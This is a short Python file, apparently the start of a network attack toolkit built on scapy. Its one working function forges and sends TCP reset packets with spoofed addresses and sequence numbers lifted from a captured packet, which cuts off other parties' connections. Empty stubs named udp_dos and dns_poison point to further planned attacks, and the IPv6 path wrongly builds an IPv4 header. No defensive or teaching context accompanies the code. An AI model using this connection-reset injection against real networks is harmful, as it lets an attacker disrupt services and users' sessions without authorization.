from scapy.layers import inet, inet6
from scapy.packet import Packet
from scapy.sendrecv import send


def tcp_rst(p: Packet, request=True, version=4):
    if not p.haslayer(inet.TCP) or not p[inet.TCP].flags.A:
        return
    if request:
        seq = p[inet.TCP].ack
        ack = p[inet.TCP].seq
        src = p[inet.IP].dst if version == 4 else p[inet6.IPv6].dst
        dst = p[inet.IP].src if version == 4 else p[inet6.IPv6].src
        sport = p[inet.TCP].dport
        dport = p[inet.TCP].sport
    else:
        seq = p[inet.TCP].seq
        ack = p[inet.TCP].ack
        src = p[inet.IP].src if version == 4 else p[inet6.IPv6].src
        dst = p[inet.IP].dst if version == 4 else p[inet6.IPv6].dst
        sport = p[inet.TCP].sport
        dport = p[inet.TCP].dport

    exp = inet.IP(src=src, dst=dst) / inet.TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=4)
    send(exp, verbose=False)


def udp_dos():
    pass


def dns_poison():
    pass
